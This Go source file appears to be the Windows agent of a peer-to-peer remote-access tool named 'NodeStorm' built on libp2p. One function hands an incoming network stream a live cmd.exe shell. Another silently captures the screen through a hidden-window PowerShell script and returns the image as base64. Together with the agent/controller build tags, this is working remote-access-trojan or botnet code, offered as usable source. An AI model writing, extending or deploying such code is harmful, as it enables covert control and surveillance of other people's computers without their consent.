//go:build windows && !controller
// +build windows,!controller

package main

import (
	"io"
	"os/exec"
	"fmt"
	"strings"
	"encoding/base64"
	"syscall"

	"github.com/libp2p/go-libp2p/core/network"
)

func handleShellStream(s network.Stream) {
	defer s.Close()

	// Windows: Use cmd.exe with pipes (PTY is hard on Windows without specialized libs)
	cmd := exec.Command("cmd.exe")

	// Create pipes
	stdin, err := cmd.StdinPipe()
	if err != nil {
		s.Write([]byte("Error creating stdin pipe: " + err.Error()))
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		s.Write([]byte("Error creating stdout pipe: " + err.Error()))
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		s.Write([]byte("Error creating stderr pipe: " + err.Error()))
		return
	}

	if err := cmd.Start(); err != nil {
		s.Write([]byte("Error starting cmd: " + err.Error()))
		return
	}

	// Welcome message removed to avoid duplication with native cmd.exe banner
	// s.Write([]byte("Microsoft Windows [NodeStorm Shell]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\n"))

	// Pipe stdout/stderr to stream
	go func() {
		io.Copy(s, stdout)
	}()
	go func() {
		io.Copy(s, stderr)
	}()

	// Pipe stream to stdin
	go func() {
		io.Copy(stdin, s)
		stdin.Close() // Close stdin when stream closes
	}()

	cmd.Wait()
}

// captureScreenFallback tries to capture screen using PowerShell
func captureScreenFallback() ([]byte, error) {
	// PowerShell script to capture screen and output Base64 PNG
	psScript := `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $bitmap.Size)
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
`
	// Execute PowerShell
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", psScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("powershell fallback failed: %v", err)
	}

	// Decode Base64
	b64 := strings.TrimSpace(string(out))
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}

	return data, nil
}
